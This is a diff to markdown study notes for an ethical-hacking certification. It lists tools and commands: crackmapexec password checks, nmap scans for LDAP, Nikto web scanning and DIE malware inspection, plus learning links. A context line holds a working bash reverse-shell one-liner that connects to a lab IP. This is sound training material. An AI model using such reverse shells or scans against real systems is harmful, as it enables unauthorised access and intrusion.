@@ -118,7 +118,17 @@ Use crackmapexec to check if any of these passwords work for any of the users fo
     + If RevShell is not working try to enclose payload in bash -c "" like this: bash -c "bash -i >& /dev/tcp/10.10.14.6/1337 0>&1"
 + [Useful Commands](https://github.com/xaferima/Certified-Ethical-Hacking-Practical-Tools/blob/main/Commands-4-tools-used)
 + [VERY GOOD TOOLS EXPLAINATION divided by CyberKill Chain phases](https://book.thegurusec.com/certifications/certified-ethical-hacker-practical/reconnaissance-footprinting)
-  
+
+### Useful scenarios:
+## Entry point of malware:
++ User DIE Tool for windows.
+
+## FQDN
++ Search for port 389, LDAP or active directory (nmap -p389 -sV ip/24) or (nmap -A 192.168.0.0/24)
+
+## Exploit web App
++ Nikto -host www.host.com
+
 ### Useful links for learning:
 + [List of vulnerable Web App](https://www.theprohack.com/p/web-hacking-practice-list-of-vulnerable.html)
 + [IppSec Channel](https://www.youtube.com/@ippsec/featured)
